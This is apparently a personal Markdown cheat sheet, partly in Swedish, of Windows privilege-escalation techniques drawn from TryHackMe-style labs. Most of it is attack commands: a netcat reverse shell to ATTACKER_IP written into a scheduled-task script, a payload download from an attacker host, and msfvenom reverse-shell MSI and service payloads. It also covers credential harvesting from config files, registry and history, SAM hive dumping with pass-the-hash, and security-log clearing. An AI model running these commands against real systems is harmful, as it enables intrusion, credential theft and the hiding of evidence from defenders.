## Bra att ha kommandon
```
Skriv kommando till fil
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

#Visa rättigheterna för en fil
icacls c:\tasks\schtask.bat

#Lägg till rättigheter på fil
icacls WService.exe /grant Everyone:F

Hämta fil powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

RDP-connect with NLA
xfreerdp /u:THMBackup /cert:ignore /v:10.10.3.178 
xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard

psexec
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes

Visa installerade programvaror
wmic product get name,version,vendor

```


## Tools for PrivEsc check

### WinPEAS
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

    winpeas.exe > outputfile.txt


### PrivescCheck (Powershell)
https://github.com/itm4n/PrivescCheck

```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

### WesNG
https://github.com/bitsadmin/wesng

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

```
C:\ > systeminfo > systeminfo.txt
```
```
user@kali$ wes.py systeminfo.txt
```


## Unattended
```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
```
As part of these files, you might encounter credentials:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History
type:
   %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

## Show saved credentials
Show saved creds

    cmdkey /list
Run command with saved cred

    runas /savecred /user:admin cmd.exe

## IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

## PuTTY
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Scheduled Tasks

```
#List all scheduled tasks
schtasks
#List info about the scheduled tasks
schtasks /query /tn vulntask /fo list /v
# run the scheduled task
schtasks /run /tn vulntask

```

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.236.130 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Services
    sc qc apphostsvc     


Services in registry

    HKLM\SYSTEM\CurrentControlSet\Services\

Restart service

    C:\> sc stop windowsscheduler
    C:\> sc start windowsscheduler


Create service-payload
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe




### Permissions        
Service permission

    accesschk64.exe -qlc thmservice

File permission

    icacls c:\tasks\schtask.bat



### Unquoted Service Paths

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by 
```
SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        
SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
        
    When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2

```
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		
```

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.


### Service
Reconfigugre service

    sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem




### Whoami /priv (as Admin)


| Privilege | Impact | Tool | Execution path | Remarks |
| --- | --- | --- | --- | --- |
|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
|`SeAudit`| **Threat** | 3rd party tool | Write events to the Security event log to fool auditing or to overwrite old events. |Writing own events is possible with [`Authz Report Security Event`](https://learn.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzreportsecurityevent) API.<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeAuditPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeBackup`| ***Admin*** | 3rd party tool | 1. Backup the `HKLM\SAM` and `HKLM\SYSTEM` registry hives <br> 2. Extract the local accounts hashes from the `SAM` database <br> 3. Pass-the-Hash as a member of the local `Administrators` group <br><br> Alternatively, can be used to read sensitive files. | For more information, refer to the [`SeBackupPrivilege` file](SeBackupPrivilege.md).<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeBackupPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeChangeNotify`| None | - | - | Privilege held by everyone. Revoking it may make the OS (Windows Server 2019) unbootable. |
|`SeCreateGlobal`| ? | ? | ? ||
|`SeCreatePagefile`| None | ***Built-in commands***  | Create hiberfil.sys, read it offline, look for sensitive data. | Requires offline access, which leads to admin rights anyway.<br> - See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreatePagefilePrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeCreatePermanent`| ? | ? | ? ||
|`SeCreateSymbolicLink`| ? | ? | ? ||
|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`.<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreateTokenPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) ||
|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1).<br> - See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeDelegateSession-`<br>`UserImpersonate`| ? | ? | ? | Privilege name broken to make the column narrow. |
|`SeEnableDelegation`| None | - | - | The privilege is not used in the Windows OS. |
|`SeImpersonate`| ***Admin*** | 3rd party tool | Tools from the *Potato family* (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato, SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer, etc. | Similarly to `SeAssignPrimaryToken`, allows by design to create a process under the security context of another user (using a handle to a token of said user). <br><br> Multiple tools and techniques may be used to obtain the required token. |
|`SeIncreaseBasePriority`| Availability | ***Built-in commands*** | `start /realtime SomeCpuIntensiveApp.exe` | May be more interesting on servers. |
|`SeIncreaseQuota`| Availability | 3rd party tool | Change cpu, memory, and cache limits to some values making the OS unbootable. | - Quotas are not checked in the safe mode, which makes repair relatively easy.<br> - The same privilege is used for managing registry quotas. |
|`SeIncreaseWorkingSet`| None | - | - | Privilege held by everyone. Checked when calling fine-tuning memory management functions. |
|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `fltMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
|`SeLockMemory`| Availability | 3rd party tool | Starve System memory partition by moving pages. | PoC published by [Walied Assar (@waleedassar)](https://twitter.com/waleedassar/status/1296689615139676160) |
|`SeMachineAccount`| None | - | - |The privilege is not used in the Windows OS. |
|`SeManageVolume`| ***Admin*** | 3rd party tool | 1. Enable the privilege in the token<br>2. Create handle to \\.\C: with `SYNCHRONIZE \| FILE_TRAVERSE`<br>3. Send the `FSCTL_SD_GLOBAL_CHANGE` to replace `S-1-5-32-544` with `S-1-5-32-545`<br>4. Overwrite utilman.exe etc. | `FSCTL_SD_GLOBAL_CHANGE` can be made with this [piece of code](https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c).  |
|`SeProfileSingleProcess`| None | - | - | The privilege is checked before changing (and in very limited set of commands, before querying) parameters of Prefetch, SuperFetch, and ReadyBoost. The impact may be adjusted, as the real effect is not known. |
|`SeRelabel`| **Threat** | 3rd party tool | Modification of system files by a legitimate administrator | See: [MIC documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)<br> <br> Integrity labels provide additional protection, on top of well-known ACLs. Two main scenarios include:<br>- protection against attacks using exploitable applications such as browsers, PDF readers etc.<br>- protection of OS files.<br> <br>`SeRelabel` present in the token will allow to use `WRITE_OWNER` access to a resource, including files and folders. Unfortunately, the token with IL less than *High* will have SeRelabel privilege disabled, making it useless for anyone not being an admin already.<br> <br>See great [blog post](https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html) by [@tiraniddo](https://twitter.com/tiraniddo) for details.|
|`SeRemoteShutdown`| Availability | ***Built-in commands*** | `shutdown /s /f /m \\server1 /d P:5:19` | The privilege is verified when shutdown/restart request comes from the network. 127.0.0.1 scenario to be investigated. |
|`SeReserveProcessor`| None | - | - | It looks like the privilege is no longer used and it appeared only in a couple of versions of winnt.h. You can see it listed i.e. in the source code published by Microsoft [here](https://code.msdn.microsoft.com/Effective-access-rights-dd5b13a8/sourcecode?fileId=58676&pathId=767997020). |
|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeRestorePrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeSecurity`| **Threat** | ***Built-in commands*** |- Clear Security event log: `wevtutil cl Security`<br> <br>- Shrink the Security log to 20MB to make events flushed soon: `wevtutil sl Security /ms:0`<br> <br>- Read Security event log to have knowledge about processes, access and actions of other users within the system.<br> <br>- Knowing what is logged to act under the radar.<br> <br>- Knowing what is logged to generate large number of events effectively purging old ones without leaving obvious evidence of cleaning. <br> <br>- Viewing and changing object SACLs (in practice: auditing settings) | See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeSecurityPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeShutdown`| Availability | ***Built-in commands*** | `shutdown.exe /s /f /t 1` | Allows to call most of NtPowerInformation() levels. To be investigated. Allows to call NtRaiseHardError() causing immediate BSOD and memory dump, leading potentially to sensitive information disclosure - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeShutdownPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeSyncAgent`| None | - | - | The privilege is not used in the Windows OS. |
|`SeSystemEnvironment`| _Unknown_ | 3rd party tool | The privilege permits to use `NtSetSystemEnvironmentValue`, `NtModifyDriverEntry` and some other syscalls to manipulate UEFI variables. |The privilege is required to run sysprep.exe.<p>Additionally:<br>- Firmware environment variables were commonly used on non-Intel platforms in the past, and now slowly return to UEFI world. <br>- The area is highly undocumented.<br>- The potential may be huge (i.e. breaking Secure Boot) but raising the impact level requires at least PoC.<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeSystemEnvironmentPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeSystemProfile`| ? | ? | ? ||
|`SeSystemtime`| **Threat** | ***Built-in commands*** | `cmd.exe /c date 01-01-01`<br>`cmd.exe /c time 00:00` | The privilege allows to change the system time, potentially leading to audit trail integrity issues, as events will be stored with wrong date/time.<br>- Be careful with date/time formats. Use always-safe values if not sure.<br>- Sometimes the name of the privilege uses uppercase "T" and is referred as `SeSystemTime`. |
|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icacls.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.<br> - See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeTakeOwnershipPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. | Sample code+exe creating arbitrary tokens to be found at [PsBits](https://github.com/gtworek/PSBits/tree/master/VirtualAccounts). |
|`SeTimeZone`| Mess | ***Built-in commands*** | Change the timezone. `tzutil /s "Chatham Islands Standard Time"` ||
|`SeTrustedCredManAccess`| **Threat** | 3rd party tool | Dumping credentials from Credential Manager | Great [blog post](https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html) by [@tiraniddo](https://twitter.com/tiraniddo).<br> - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeTrustedCredManAccessPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re) |
|`SeUndock`| None | - | - | The privilege is enabled when undocking, but never observed it checked to grant/deny access. In practice it means it is actually unused and cannot lead to any escalation. |
|`SeUnsolicitedInput`| None | - | - | The privilege is not used in the Windows OS. |


### Dumpa privs

Backup system and SAM-hashes
```
#Dump privs
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
```

```
#Crack
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

```
#Abuse
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes 
```
